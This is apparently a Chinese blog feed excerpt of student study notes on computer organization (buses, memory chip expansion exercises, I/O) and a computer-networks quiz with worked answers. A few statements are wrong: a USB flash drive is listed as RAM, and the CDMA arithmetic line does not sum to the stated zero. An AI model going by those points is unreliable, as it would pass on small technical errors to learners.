<li><p>按<u>传输信息的种类</u>分：</p>
<p>1、<strong>数据总线</strong>【双向传输数据的通道，与机器的字长、存储字有关】。</p>
<p>2、<strong>地址总线</strong>【单向传输地址，由CPU输出，与存储地址、I&#x2F;O地址有关，地址线的位数与存储单元的个数有关，地址线为20根，存储单元个数为2^20^】。</p>
<p>3、<strong>控制总线</strong>【具有输入和输出】。</p>
</li>
</ul>
</li>
<li><p>总线的特性：机械特性、电气特性、功能特性、时间特性。</p>
</li>
<li><p>总线控制：</p>
<ul>
<li>总线上的设备按其<u><strong>对总线是否具有控制功能</strong></u>分为<u>主设备</u>和<u>从设备</u>。</li>
<li>总线判优控制可分为<u><strong>分布式</strong></u>和<u><strong>集中式</strong></u>【<strong>1、链式查询；2、计数器定时查询；3、独立请求方式</strong>】。</li>
</ul>
</li>
<li><p>总线通信控制：</p>
<ul>
<li>同步通信：通信双方有<u>“统一时标”</u>控制数据传输称为同步通信。</li>
<li>异步通信：没有公共的时钟标准</li>
<li>半同步通信：同步通信和异步通信相结合</li>
<li>分离式通信</li>
</ul>
</li>
</ol>
<h2 id="第四章：存储器"><a href="#第四章：存储器" class="headerlink" title="第四章：存储器"></a>第四章：存储器</h2><ol>
<li><p>存储器按**<u>存取方式</u>**分类分为：</p>
<ul>
<li>随机存储器（Random Access Memory ,RAM）：<ul>
<li>静态RAM【触发器原理寄存信息】</li>
<li>动态RAM【电容充放电原理寄存信息】</li>
<li>举例：U盘、内存条</li>
</ul>
</li>
<li>只读存储器（Read Only Memory ,ROM）</li>
<li>串行访问存储器<ul>
<li>顺序存取存储器</li>
<li>直接存取存储器</li>
</ul>
</li>
</ul>
</li>
<li><p>字节寻址的主存地址分配：</p>
<ul>
<li><p>大端方式【高位字节地址作为字地址】</p>
<p>​																	         高位																										     低位</p>
<table>
<thead>
<tr>
<th>字地址</th>
<th>字</th>
<th>节</th>
<th>地</th>
<th>址</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>1</td>
<td>2</td>
<td>3</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>5</td>
<td>6</td>
<td>7</td>
</tr>
<tr>
<td>8</td>
<td>8</td>
<td>9</td>
<td>10</td>
<td>11</td>
</tr>
</tbody></table>
<p>4X8位&#x3D;32位CPU</p>
</li>
<li><p>小端方式【地位字节地址作为字地址】</p>
<p>​																											高位																		低位</p>
<table>
<thead>
<tr>
<th>字地址</th>
<th>字节</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>2</td>
<td>3</td>
<td>2</td>
</tr>
<tr>
<td>4</td>
<td>5</td>
<td>4</td>
</tr>
</tbody></table>
<p>2X8位&#x3D;16位CPU</p>
</li>
</ul>
</li>
<li><p>例题【4.6】某机字长为32位，其存储容量是64KB，按字编址其寻址范围为( <u>64KB&#x2F;(32b&#x2F;8b)</u>&#x3D;<u>64KB&#x2F;4B</u>&#x3D;16K );按字节编址的寻址范围为(     64KB&#x2F;1B&#x3D;64K     ),并画出主存字地址和字节地址的分配情况。</p>
<ul>
<li><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%BB%E5%AD%98%E7%9A%84%E7%BC%96%E5%9D%80.png" alt="主存的编址"></li>
</ul>
</li>
<li><p>例题【4.14】某8位微型计算机地址码位18位，若使用4KX4位的RAM芯片组成模块板结构的存储器，试问：</p>
<ol>
<li><p>该机所允许的组大主存空间是多少？</p>
<ul>
<li>2^18^X8位&#x3D;2^8^K X8b&#x3D;256KB</li>
</ul>
</li>
<li><p>若每个模块板为32KX8位，共需要多少个模块板？</p>
<ul>
<li>(2^8^KX8b)&#x2F;(32KX8b)&#x3D;2^3^&#x3D;8片</li>
</ul>
</li>
<li><p>每个模板块内共有多少片RAM芯片？</p>
<ul>
<li>(32KX8b)&#x2F;(4KX4b)&#x3D;8*2&#x3D;16片</li>
</ul>
</li>
<li><p>共有多少片RAM？</p>
<ul>
<li>​	16*8&#x3D;128片</li>
</ul>
</li>
<li><p>CPU如何选择各模板？</p>
<ul>
<li><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/4-14.png" alt="4—14"></li>
</ul>
</li>
<li><p>例题【4-15】设CPU共有16根地址线,8根数据线,并用$\overline{\text{MREQ}}$(低电平有效)作访存控制信号， $\overline{\text{R&#x2F;W}}$作读&#x2F;写命令信号(高电平为读,低电平为写)。现有这些存储芯片:ROM(2K×8位,4K×4位,8K×8位),RAM(1K×4位，2K×8位，4K×8位)及74138译码器和其他门电路(门电路自定)。</p>
<p>试从上述规格中选用合适的芯片,画出CPU和存储芯片的连接图。要求如下:<br>(1)最小4K地址为系统程序区.4096~16383地址范围为用户程序区。<br>(2)指出选用的存储芯片类型及数量。<br>(3)详细画出片选逻辑。<br>答：<br>(1)地址空间分配图:<br>系统程序区(ROM共4KB):0000H-0FFFH<br>用户程序区(RAM共12KB):1000H-3FFFH[(4096-16383)]<br>(2)选片:<br>ROM:选择4K×4位芯片2片,位并联<br>RAM:选择4K×8位芯片3片,字串联(RAM1地址范围为:1000H-1FFFH,RAM2地址范围为2000H-2FFFH, RAM3地址范围为:3000H-3FFFH)</p>
<p>(3)各芯片二进制地址分配如下</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/4-15-1.png" alt="4-15-1"></p>
<p>CPU和存储器连接逻辅图及片选逻辑如下图所示:</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/4-15-2.png" alt="4-15-2"></p>
<p>原文链接：<a class="link" href="https://blog.csdn.net/weixin_45735391/article/details/127178726">https://blog.csdn.net/weixin_45735391/article/details/127178726 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>CPU假设同上题，现有8片8K×8位的RAM芯片与CPU相连。</p>
<p>(1)用74138译码器画出CPU与存储芯片的连接图。<br>(2)写出每片RAM的地址范围。<br>(3)如果运行时发现不论往哪片RAM写入数据，以A000H为起始地址的存储芯片都有与其相同的数据分析故障原因。<br>(4)根据(1)的连接图,若出现地址线 A 13 A_{13} A13与CPU断线,并搭接到高电平上,将出现什么后果?<br>答:<br>(1)CPU与存储器芯片连接逻辑图:<br><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/4-16-1.png" alt="4-16-1"></p>
<p>(2)地址空间分配图:<br>RAM0:0000H-1FFFH<br>RAM1:2000H-3FFFH<br>RAM2:4000H-5FFFH<br>RAM3:6000H-7FFFH<br>RAM4:8000H-9FFFH<br>RAM5:A000H-BFFFH<br>RAM6:C000H-DFFFH<br>RAM7:E000H-FFFFH</p>
<p>(3)如果运行时发现不论往哪片RAM写入数据后，以A000H为起始地址的存储芯片(RAM5)都有与其相同的数据，则根本的故障原因为:该存储芯片的片选输入端很可能总是处于低电平。<br>假设芯片与译码器本身都是好的，可能的情况有:<br>①该片的 $\overline{\text{CS}}$端与 $\overline{\text{WE}}$端错连或短路:<br>②该片的 $\overline{\text{CS}}$端与CPU的 $\overline{\text{MREQ}}$端错连或短路；<br>③该片的 $\overline{\text{CS}}$端与地线错连或短路。</p>
<p>(4)如果地址线A13与CPU断线，并搭接到高电平上，将会出现A13恒为“1”的情况。此时存储器只能寻址A13&#x3D;1的地址空间(奇数片)，A13&#x3D;0的另一半地址空间(偶数片)将永远访问不到。若对A13&#x3D;0的地址空间(偶数片)进行访问，只能错误地访问到A13&#x3D;1的对应空间(奇数片)中去。</p>
<p>原文链接：<a class="link" href="https://blog.csdn.net/weixin_45735391/article/details/127178726">https://blog.csdn.net/weixin_45735391/article/details/127178726 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>提高访存数度的措施：</p>
<ul>
<li>采用高速器件</li>
<li>采用层次结构Cash-主存结构</li>
<li>调整主存结构</li>
</ul>
</li>
<li><p>多体并行系统</p>
<ul>
<li>​	高位交叉编址<ul>
<li>顺序编址</li>
<li>能够增加内存的容量，但不能提高速度</li>
</ul>
</li>
<li>低位交叉编址<ul>
<li>个体轮流编址，能够增加速度带宽</li>
</ul>
</li>
</ul>
</li>
<li><p>排队器优先级判断:</p>
<ul>
<li>严重影响CPU工作的请求源给予次高优先级</li>
<li>易发生代码丢失的请求源给予最高优先级</li>
</ul>
</li>
<li><p>cache-主存地址映射：</p>
<ul>
<li>直接映射</li>
<li>全相联映射</li>
<li>组相联映射</li>
</ul>
</li>
<li><p>替换策略：</p>
<ul>
<li>先进先出策略</li>
<li>近期最少使用算法</li>
<li>随机法</li>
</ul>
</li>
</ol>
<h2 id="第五章：输入输出系统"><a href="#第五章：输入输出系统" class="headerlink" title="第五章：输入输出系统"></a>第五章：输入输出系统</h2><ol>
<li><p>输入输出系统发展的4个阶段：</p>
<ol>
<li>早期阶段 </li>
<li>接口模块和DMA阶段</li>
<li>具有通道结构的阶段</li>
<li>具有I&#x2F;O处理机的阶段</li>
</ol>
</li>
<li><p>I&#x2F;O设备与主机设备交换信息时，控制方式有：</p>
<ol>
<li>程序查询方式</li>
<li>程序中断方式</li>
<li>直接存储器存取 方式</li>
<li>I&#x2F;O通道方式 </li>
<li>I&#x2F;O处理机方式</li>
</ol>
</li>
<li><p>I&#x2F;O 设备的分类 ：</p>
<ol>
<li>人机交互设备 </li>
<li>计算机的信息 存储设备</li>
<li>机-——机通信设备</li>
</ol>
</li>
</ol>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>计算机网络</title>
    <url>/2024/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer">

<p>1、在OSI参考模型中，控制两个对等实体进行逻辑通信的规则的集合称为（协议  ）。</p>
<blockquote>
<p>在OSI参考模型中，控制两个对等实体进行逻辑通信的规则的集合称为<strong>协议</strong>。以下是关于OSI参考模型中协议及其作用的详细解释：</p>
<ol>
<li><p><strong>协议的定义</strong>：协议是控制两个对等实体进行逻辑通信的规则的集合。这些规则包括通信的内容、通信的方式等，确保数据在OSI参考模型的各层之间能够正确、可靠地传输。</p>
</li>
<li><p>协议的作用</p>
<p>：</p>
<ul>
<li><strong>确保通信的可靠性</strong>：通过定义明确的通信规则，协议能够确保数据在传输过程中不被损坏或丢失。</li>
<li><strong>实现数据的正确传输</strong>：协议规定了数据的格式、编码方式等，确保发送方和接收方能够正确地解析和传输数据。</li>
<li><strong>支持不同系统之间的互操作性</strong>：由于OSI参考模型是一个开放的标准，不同的计算机系统可以通过遵循相同的协议来实现互操作和数据交换。</li>
</ul>
</li>
<li><p><strong>OSI参考模型与协议</strong>：OSI参考模型将网络系统划分为七层，每一层都定义了相应的协议和功能。例如，物理层定义了电气和物理连接特性；数据链路层定义了帧的传输和差错控制；网络层负责路由选择和分组转发；传输层提供端到端的可靠传输服务等。这些协议共同构成了OSI参考模型的基础，支持着网络系统的正常运行。</p>
</li>
</ol>
<p>综上所述，在OSI参考模型中，控制两个对等实体进行逻辑通信的规则的集合称为协议。这些协议确保了数据在OSI参考模型的各层之间能够正确、可靠地传输，支持着网络系统的正常运行。</p>
</blockquote>
<p>2、在OSI参考模型中，第n层与它之上的第n+1层的关系是（ 第n层为第n+1层提供服务）。</p>
<p>A、第n层为第n+1层提供服务</p>
<p>B、第n+1层为从第n层接收的报文添加一个报头</p>
<p>C、第n层使用第n+1层提供的服务</p>
<p>D、第n层和第n+1层相互没有影响</p>
<hr>
<p>3、在OSI参考模型中，对等实体是指（收发双方相同层次中的实体 ）。</p>
<blockquote>
<p>在OSI参考模型中，对等实体（Peer Entity）是指<strong>位于不同机器上，但处于同一层次，完成相同功能的实体</strong>。具体来说：</p>
<ol>
<li><strong>实体（Entity）</strong>：在OSI参考模型中，每一层中用于实现该层功能的活动元素被称为实体。实体可以是软件实体（如一个进程、电子邮件系统、应用程序等）也可以是硬件实体（如终端、智能输入&#x2F;输出芯片等）。软件实体可以嵌入在本地操作系统中，或者用户应用程序中。</li>
<li><strong>对等层（Peer Layer）</strong>：不同机器上位于同一层次、完成相同功能的层被称为对等层。例如，主机A的应用层和主机B的应用层互为对等层，主机A的会话层和主机B的会话层也互为对等层。</li>
<li><strong>对等实体</strong>：当两个不同机器上的实体处于同一层次，且完成相同的功能时，这两个实体就被称为对等实体。例如，主机A和主机B传输层中的传输实体互为对等实体。</li>
</ol>
<p>综上所述，对等实体是OSI参考模型中位于不同机器上，但处于同一层次、完成相同功能的实体。这种结构有助于实现网络系统中不同机器之间的有效通信和协作。</p>
</blockquote>
<hr>
<p>4、TCP通信双方在基于TCP连接进行通信之前，首先要通过“三报文握手”来建立TCP连接，这属于网络协议三要素中的（ ）。</p>
<blockquote>
<p>TCP通信双方在基于TCP连接进行通信之前，首先要通过“三报文握手”来建立TCP连接，这属于网络协议三要素中的<strong>时序</strong>。</p>
<p>网络协议的三要素包括：</p>
<ol>
<li><p><strong>语义</strong>：解释控制信息每个部分的意义。它规定了需要发出何种控制信息，以及完成的动作与做出什么样的响应。在TCP三次握手中，语义规定了通信双方需要发出和响应的控制信息，如SYN（同步序列编号）和ACK（确认）等。</p>
</li>
<li><p><strong>语法</strong>：用户数据与控制信息的结构与格式，以及数据出现的顺序。在TCP协议中，语法定义了数据包（如SYN包、SYN-ACK包和ACK包）的格式和结构。</p>
</li>
<li><p>时序</p>
<p>：对事件发生顺序的详细说明（也可称为“同步”）。在TCP三次握手中，时序定义了建立连接时事件的顺序，包括：</p>
<ul>
<li>客户端发送带有SYN标志的数据包（第一次握手）。</li>
<li>服务端收到后发送带有SYN和ACK标志的数据包（第二次握手）。</li>
<li>客户端再发送带有ACK标志的数据包以确认连接（第三次握手）。</li>
</ul>
</li>
</ol>
</blockquote>
<hr>
<p>5、在数据从源主机传送至目的主机的过程中，不参与数据封装工作的是（物理层 ）。</p>
<blockquote>
<p>在数据从源主机传送至目的主机的过程中，不参与数据封装工作的是<strong>物理层</strong>。</p>
<p>数据封装是一个从源主机开始，逐层向下封装数据的过程，每一层都会在其数据上添加该层对应的头部信息（或尾部信息），形成该层的协议数据单元（PDU）。具体来说，这个过程包括：</p>
<ol>
<li><strong>应用层</strong>：该层负责处理网络应用程序之间的通信，可能会使用到各种应用协议，如HTTP、FTP等。在这一层，数据通常会被封装成应用层PDU，即应用层报文。</li>
<li><strong>表示层</strong>：该层的功能包括数据解密与加密、压缩、格式转换等，但并不直接参与数据封装工作。</li>
<li><strong>传输层</strong>：该层负责为源主机和目的主机之间的进程提供端到端的通信服务。在这一层，数据会被封装成传输层PDU，即数据段（TCP）或数据报（UDP）。</li>
<li><strong>网络层</strong>：该层负责处理分组在多个网络上的传输（路由）。在这一层，数据会被封装成网络层PDU，即IP数据报。</li>
<li><strong>数据链路层</strong>：该层负责在相邻节点之间无差错地传送数据帧。在这一层，网络层传下来的IP数据报会被封装成数据帧。</li>
</ol>
<p>而<strong>物理层</strong>主要解决的是使用何种信号在连接在各种计算机的各种传输介质上传输比特流的问题，从而屏蔽物理差异。它并不直接参与数据的封装工作，而是为数据在传输介质上的传输提供物理通道和接口。</p>
<p>因此，不参与数据封装工作的是物理层。</p>
</blockquote>
<hr>
<p>6、假设有500B的数据待发送（无拆分），需要经过OSI参考模型的逐层封装，除物理层外，其他各层在封装PDU时均引入20B的额外开销，则数据传输效率约为（81%  ）</p>
<blockquote>
<p>假设有500B（字节）的数据待发送（无拆分），并且需要经过OSI参考模型的逐层封装，除物理层外，其他各层在封装PDU（协议数据单元）时均引入20B的额外开销。我们可以按照以下步骤来计算数据传输效率：</p>
<ol>
<li>确定每层引入的额外开销<ul>
<li>除物理层外，每层引入20B的额外开销。</li>
<li>OSI参考模型共有7层，但物理层不引入额外开销，所以实际引入额外开销的层数为6层。</li>
</ul>
</li>
<li>计算总额外开销<ul>
<li>6层 × 20B&#x2F;层 &#x3D; 120B</li>
</ul>
</li>
<li>计算总发送数据量<ul>
<li>原始数据量 + 总额外开销 &#x3D; 500B + 120B &#x3D; 620B</li>
</ul>
</li>
<li>计算数据传输效率<ul>
<li>数据传输效率 &#x3D; 原始数据量 &#x2F; 总发送数据量</li>
<li>数据传输效率 &#x3D; 500B &#x2F; 620B ≈ 0.8065（或约80.65%）</li>
</ul>
</li>
</ol>
<p>综上所述，数据传输效率约为80.65%。这意味着大约80.65%的数据量是由实际的应用层数据组成的，而剩下的部分则是由于OSI参考模型中各层在封装过程中引入的额外开销。</p>
</blockquote>
<hr>
<p>7.将物理信道的总频带分割成若干子信道，每个子信道传输一路信号，这种信道复用技术是（ ）。</p>
<blockquote>
<p>将物理信道的总频带分割成若干子信道，每个子信道传输一路信号，这种信道复用技术称为<strong>频分复用（FDM，Frequency Division Multiplexing）</strong>。</p>
<p>频分复用技术的具体特点包括：</p>
<ol>
<li>原理：将用于传输信道的总带宽划分成若干个子频带（或称子信道），每一个子信道传输1路信号。</li>
<li>约束条件：<ul>
<li>所有子信道的带宽和不能超过信道的总带宽。</li>
<li>为了防止子信道之间相互干扰，相邻的子信道之间应该插入“保护频带”。</li>
</ul>
</li>
<li>优点：<ul>
<li>实现简单，充分利用了传输介质的带宽，系统效率较高。</li>
<li>频分复用技术的特点是所有子信道传输的信号以并行的方式工作，每一路信号传输时可不考虑传输时延。</li>
</ul>
</li>
</ol>
</blockquote>
<hr>
<p>8、A、B、C三个站点采用CDMA技术进行通信，A、B要向C发送数据，设A的码片序列为+1，-1，-1，+1，+1，+1，+1，-1。则B可以选用的码片序列为（  ）。</p>
<blockquote>
<p>-1，+1，-1，+1，-1，+1，+1，+1</p>
<p>(−1×+1)+(+1×−1)+(−1×−1)+(+1×+1)+(−1×+1)+(+1×+1)+(+1×+1)+(−1×−1)</p>
<p>&#x3D;−1−1+1+1−1+1+1+1</p>
<p>&#x3D;0</p>
</blockquote>
<hr>
<p>9、下列网络连接设备工作在数据链路层的是（ 交换机）。</p>
<blockquote>
<p>在网络中，设备根据其工作的OSI（Open Systems Interconnection）模型层次来分类。数据链路层（Data Link Layer）是OSI模型中的第二层，主要负责在相邻的两个网络节点间无差错的传送数据帧，并进行流量控制。</p>
<p>现在，我们分析下列常见的网络连接设备，以确定哪些设备工作在数据链路层：</p>
<ol>
<li><strong>路由器（Router）</strong>：路由器工作在网络层，主要负责路由选择和转发数据包。</li>
<li><strong>交换机（Switch）</strong>：交换机工作在数据链路层，主要负责数据的转发和过滤。交换机通过识别数据帧中的MAC地址来决定将数据转发到哪个端口。</li>
<li><strong>集线器（Hub）</strong>：集线器工作在物理层，主要用于将多个网络设备连接在一起，起到信号放大和重生的作用。</li>
<li><strong>网关（Gateway）</strong>：网关可以是任何设备或软件，它负责在不同协议或网络之间转换数据。通常，网关工作在网络层以上，但在具体实现中可能涉及多个层次。</li>
<li><strong>网桥（Bridge）</strong>：网桥工作在数据链路层，用于连接两个或多个局域网（LAN）。网桥通过识别数据帧中的MAC地址来决定是否转发数据。</li>
</ol>
</blockquote>
<hr>
<p>10、下列不能隔离碰撞域的设备是(集线器)</p>
<p>A、网桥</p>
<p>B、集线器</p>
<p>C、交换机</p>
<p>D、路由器</p>
<blockquote>
<p>A、网桥（Bridge） - 网桥工作在数据链路层，能够隔离碰撞域。它可以根据数据帧中的MAC地址来转发数据，确保数据只在需要的链路上传输，从而减少了碰撞的可能性。</p>
<p>B、集线器（Hub） - 集线器工作在物理层，采用广播方式传输数据。当集线器连接的任何一台设备发送数据时，所有数据都会被发送到集线器的每一个端口，这意味着所有的设备都处于同一个碰撞域中。</p>
<p>C、交换机（Switch） - 交换机同样工作在数据链路层，但它能够识别每个端口的MAC地址，并根据这些信息智能地转发数据。因此，交换机能够隔离碰撞域，确保每个端口下的设备都处于独立的碰撞域中。</p>
<p>D、路由器（Router） - 路由器工作在网络层，它可以根据IP地址来转发数据包。由于路由器连接的是不同的网络段，因此它天然地隔离了碰撞域。此外，路由器还可以隔离广播域。</p>
</blockquote>
<hr>
<p>11、10台用户主机通过一台交换机连接成10Mb&#x2F;s的交换式以太网，每个用户能够占有的带宽是（ 10Mb&#x2F;s）。</p>
<blockquote>
<p>在交换式以太网中，每个用户主机通过交换机连接时，都能获得独立的、与交换机接口速率相等的带宽。这是因为交换机工作在数据链路层，能够识别每个用户主机发送的数据帧中的源MAC地址和目的MAC地址，并根据这些信息将数据帧转发到目标用户主机。</p>
<p>在本题中，有10台用户主机通过一台交换机连接成10Mb&#x2F;s的交换式以太网。由于交换机能够隔离碰撞域并为每个用户主机提供独立的带宽，因此每个用户主机能够占有的带宽就是交换机接口的速率，即10Mb&#x2F;s。</p>
<p>总结答案：每个用户能够占有的带宽是10Mb&#x2F;s。</p>
</blockquote>
<hr>
<p>12、通过集线器连接的一组主机（<strong>既是一个冲突域，又是一个广播域</strong> ）。通过交换机连接的一组主机（ <strong>组成一个广播域，但不是一个冲突域</strong>）。</p>
<p>A、组成一个冲突域，但不是一个广播域</p>
<p>B、组成一个广播域，但不是一个冲突域</p>
<p>C、既是一个冲突域，又是一个广播域</p>
<p>D、既不是冲突域，也不是广播域</p>
<blockquote>
<ol>
<li><strong>冲突域</strong>：集线器（Hub）是一种物理层设备，它采用广播方式发送数据。当集线器下连接的主机设备间传输数据时，数据包是以广播的方式进行传输的。因为集线器不能识别MAC地址和IP地址，所以同一时刻由集线器连接的网络中只能传输一组数据。如果有多台设备同时尝试发送数据，就会发生碰撞，导致数据需要重新发送。因此，通过集线器连接的所有主机都处于同一个冲突域中。</li>
<li><strong>广播域</strong>：广播域是指网络中所有能接收到同样广播消息的设备的集合。由于集线器无法识别MAC地址，它会将接收到的所有数据广播到所有连接的端口上。这意味着，当一台主机发送一个广播数据包时，所有通过集线器连接的主机都能接收到这个广播数据包。因此，通过集线器连接的所有主机也处于同一个广播域中。</li>
</ol>
</blockquote>
<hr>
<p>13、根据NAT协议，下列IP地址中不允许出现在因特网上的是（ ）。</p>
<p>A、192.172.56.23</p>
<p>B、172.15.34.128</p>
<p>C、192.168.32.17</p>
<p>D、172.128.56.65</p>
<blockquote>
<p>根据NAT协议，<u>不允许出现在因特网上的IP地址是私有IP地址。</u>私有IP地址是指在内部网络中使用的IP地址，这些地址不会在互联网上被分配，因此不能直接在互联网上使用。</p>
<blockquote>
<p><strong>RFC1918为私有网络预留出了三个IP地址块：</strong></p>
<ul>
<li>A类：10.0.0.0～10.255.255.255</li>
<li>B类：172.16.0.0～172.31.255.255</li>
<li>C类：192.168.0.0～192.168.255.255</li>
</ul>
</blockquote>
<p>对比上述私有IP地址范围，我们可以看出：</p>
<ul>
<li>A选项 192.172.56.23 不属于上述任何一个私有IP地址范围，因此它可以出现在因特网上。</li>
<li>B选项 172.15.34.128 虽然以172开头，但它的第二段数字是15，不在172.16.0.0～172.31.255.255的范围内，因此它也可以出现在因特网上。</li>
<li>C选项 192.168.32.17 属于C类私有IP地址范围192.168.0.0～192.168.255.255，因此它不允许出现在因特网上。</li>
<li>D选项 172.128.56.65 虽然以172开头，但它的第二段数字是128，同样不在172.16.0.0～172.31.255.255的范围内，因此它也可以出现在因特网上。</li>
</ul>
<p>综上所述，不允许出现在因特网上的IP地址是C选项 192.168.32.17。</p>
</blockquote>
<hr>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>internet</tag>
      </tags>
  </entry>
</search>
